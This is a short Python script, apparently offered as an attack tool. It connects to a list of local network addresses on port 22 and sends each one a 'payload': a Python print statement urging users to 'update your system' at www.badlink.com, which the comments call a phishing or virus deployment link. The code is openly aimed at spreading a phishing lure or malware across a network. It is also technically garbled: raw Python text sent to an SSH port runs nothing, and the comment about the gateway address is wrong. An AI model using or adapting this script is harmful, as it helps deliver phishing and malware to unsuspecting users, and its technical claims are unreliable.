import socket

# List of target IP addresses or hostnames
# 10.0.0.138 = WIFI gateway (all ips connect to this diffrent in all routers)
targets = ["10.0.0.138", "192.168.0.2", "192.168.0.3"]

# Payload to be delivered to infected hosts
# www.badlink.com = Your phishing or virus deployment link
payload = "print('You must update your system please head to www.badlink.com')"

# Iterate through the targets
for target in targets:
    try:
        # Establish a connection to the target system
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, 22))  # Example port, change as needed

        # Send the payload to the target system
        s.sendall(payload.encode())

        # Close the connection
        s.close()

        print(f"Payload delivered successfully to {target}")
    except Exception as e:
        print(f"Failed to connect to {target}: {e}")
